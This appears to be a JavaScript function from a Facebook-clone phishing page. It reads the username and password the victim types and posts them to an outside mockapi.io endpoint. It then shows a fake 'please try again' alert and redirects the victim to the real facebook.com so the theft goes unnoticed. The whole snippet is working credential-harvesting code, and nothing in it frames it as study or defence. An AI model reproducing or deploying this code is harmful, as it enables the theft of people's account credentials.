sendata = () => {
  axios({
    url: "https://5fa65c75085bf700163de3bf.mockapi.io/fbclone",
    method: "POST",
    data: {
      username: document.getElementById("usname").value,
      password: document.getElementById("pass").value,
    },
  })
    .then((res) => {
      console.log(res);
      alert("please try again");

      window.location = "https://www.facebook.com/";
    })
    .catch();
};
